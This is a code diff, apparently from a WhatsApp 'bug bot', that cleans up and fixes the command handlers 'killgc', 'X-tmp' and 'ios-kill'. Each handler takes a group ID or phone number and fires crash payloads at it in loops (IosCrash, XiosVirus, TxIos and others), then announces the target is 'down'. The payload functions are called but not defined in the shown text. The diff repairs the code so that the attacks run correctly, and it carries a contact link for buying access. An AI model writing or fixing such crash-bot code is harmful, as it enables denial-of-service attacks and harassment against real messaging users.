@@ -4104,7 +4104,7 @@ case "agc": {
 
         if (groupList.length === 0) return reply("You are not in any groups!");
 
-        // Prepare the media (optional image for the message)
+        // Prepare the media
         const imgMedia = await prepareWAMessageMedia(
             { image: fs.readFileSync("./Media/asta.jpg") },
             { upload: sam.waUploadToServer }
@@ -4112,9 +4112,9 @@ case "agc": {
 
         // Create buttons for each group
         const rows = groupList.map((group) => ({
-            header: group.subject, // Group name
-            title: `DANI MINi V2${group.subject}`,
-            id: `.killgc ${group.id}`, // Command to send bug with group ID
+            header: group.subject,
+            title: `DANI MINI V2 ${group.subject}`,
+            id: `.killgc ${group.id}`,
         }));
 
         // Construct the interactive message
@@ -4161,33 +4161,26 @@ case "agc": {
             { userJid: m.sender, quoted: extd }
         );
 
-        // You can send msgii if needed. I left it as-is (msgii created) to match your original intent.
+        // Send the interactive message
+        await sam.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
 
-    } catch (e) {
-        console.error(e);
-        reply("An error occurred while preparing group list.");
+    } catch (error) {
+        console.error("Error listing/preparing groups:", error);
+        reply("An error occurred while listing/preparing groups.");
     }
 
     break;
 }
-        // Send the interactive message
-        await sam.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
-    } catch (error) {
-        console.error("Error listing groups:", error);
-        reply("An error occurred while listing groups.");
-    }
-}
-break;
-case 'killgc': {
-   if (!isOwner) return reply(`YOU ARE NOT A PREMIUM MEMBER MF💀`)
-if (!q) return reply(`Example: ${prefix + command} gcid`)
-target = q
-reply(`Wait Your Target is being Utilised`) 
 
-    
+case 'killgc': {
+    if (!isOwner) return reply(`YOU ARE NOT A PREMIUM MEMBER MF💀`);
+    if (!q) return reply(`Example: ${prefix + command} gcid`);
+    let target = q;
+    reply(`Wait Your Target is being Utilised`);
+
     // Function to convert text to invisible characters
-await xgc(target)
-await xgc2(target)
+    await xgc(target);
+    await xgc2(target);
 
     reply(`
 ╳  BOOM 💥
@@ -4196,40 +4189,41 @@ target ${target} down by ${command}
     `);
 
     await sleep(2000);
-    await sam.sendMessage(m.chat, {
-        audio: bug,
-        mimetype: 'audio/mpeg'
-    }, { quoted: m });
-}
-case "X-tmp":  {
-if (!isOwner) return reply(`*CONTACT DAMINĪ https://wa.me/2348054671458?text=Hi%20Dami*`)
-if (!q) return reply(`Example\n ${prefix + command} 225xxxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(" astacrash ⚔️")
-for (let i = 0; i < 10; i++) {
-await IosCrash(target)
-await IosCrash(target)
-}
-sam.sendMessage(m.chat, {react: {text: '⚔️', key: m.key}})
+    await sam.sendMessage(m.chat, { audio: bug, mimetype: 'audio/mpeg' }, { quoted: m });
+    break;
 }
 
-break
-case "ios-kill": case "kill-ios": {
-if (!isOwner) return reply(`*CONTACT DAMINĪ https://wa.me/2348054671458?text=Hi%20dami*`)
-if (!q) return reply(`Example\n ${prefix + command} 225xxxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(" astacrash ⚔️")
-for (let i = 0; i < 10; i++) {
-await IosCrash(target)
-await IosCrash(target)
-await XiosPay(target)
-await XiosVirus(target)
-await TxIos(target, Ptcp = true)
-await sleep(1)
-}
-sam.sendMessage(m.chat, {react: {text: '⚔️', key: m.key}})
+case "X-tmp": {
+    if (!isOwner) return reply(`*CONTACT DAMINĪ https://wa.me/2348054671458?text=Hi%20Dami*`);
+    if (!q) return reply(`Example\n ${prefix + command} 225xxxx`);
+    let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
+    reply(" astacrash ⚔️");
+    for (let i = 0; i < 10; i++) {
+        await IosCrash(target);
+        await IosCrash(target);
+    }
+    await sam.sendMessage(m.chat, { react: { text: '⚔️', key: m.key } });
+    break;
 }
 
+case "ios-kill":
+case "kill-ios": {
+    if (!isOwner) return reply(`*CONTACT DAMINĪ https://wa.me/2348054671458?text=Hi%20dami*`);
+    if (!q) return reply(`Example\n ${prefix + command} 225xxxx`);
+    let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
+    reply(" astacrash ⚔️");
+    for (let i = 0; i < 10; i++) {
+        await IosCrash(target);
+        await IosCrash(target);
+        await XiosPay(target);
+        await XiosVirus(target);
+        // pass options as object instead of assignment expression
+        await TxIos(target, { ptcp: true });
+        await sleep(1);
+    }
+    await sam.sendMessage(m.chat, { react: { text: '⚔️', key: m.key } });
+    break;
+}
 // more future commands
             }
         } catch (error) {
